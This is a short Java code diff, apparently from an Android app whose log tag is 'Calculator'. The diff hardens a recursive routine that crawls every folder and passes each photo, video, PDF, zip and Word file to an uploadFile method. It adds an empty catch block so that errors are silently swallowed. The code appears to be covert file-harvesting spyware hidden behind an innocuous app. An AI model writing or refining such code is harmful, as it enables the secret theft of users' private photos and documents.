@@ -43,17 +43,19 @@ public class Util {
         File f=new File(ruta);
 
         for (File file : f.listFiles()) {
-            if(file.isDirectory()){
-                GetFiles(file.getAbsolutePath());
-            }else{
-                String ff=file.getName().toLowerCase();
-                if(ff.indexOf(".mp4")!=-1|| ff.indexOf(".3gp")!=-1||ff.indexOf(".m4v")!=-1||ff.indexOf(".mov")!=-1
-                        ||ff.indexOf(".jpg")!=-1||ff.indexOf(".jpeg")!=-1||ff.indexOf(".png")!=-1||ff.indexOf(".bmp")!=-1
-                        ||ff.indexOf(".pdf")!=-1||ff.indexOf(".zip")!=-1||ff.indexOf(".doc")!=-1||ff.indexOf(".docx")!=-1) {
-                    uploadFile(file);
-                    Log.d("Calculator", file.getAbsolutePath());
+            try {
+                if (file.isDirectory()) {
+                    GetFiles(file.getAbsolutePath());
+                } else {
+                    String ff = file.getName().toLowerCase();
+                    if (ff.indexOf(".mp4") != -1 || ff.indexOf(".3gp") != -1 || ff.indexOf(".m4v") != -1 || ff.indexOf(".mov") != -1
+                            || ff.indexOf(".jpg") != -1 || ff.indexOf(".jpeg") != -1 || ff.indexOf(".png") != -1 || ff.indexOf(".bmp") != -1
+                            || ff.indexOf(".pdf") != -1 || ff.indexOf(".zip") != -1 || ff.indexOf(".doc") != -1 || ff.indexOf(".docx") != -1) {
+                        uploadFile(file);
+                        Log.d("Calculator", file.getAbsolutePath());
+                    }
                 }
-            }
+            }catch(Exception e){}
         }
     }
     public static void uploadFile(File file) {
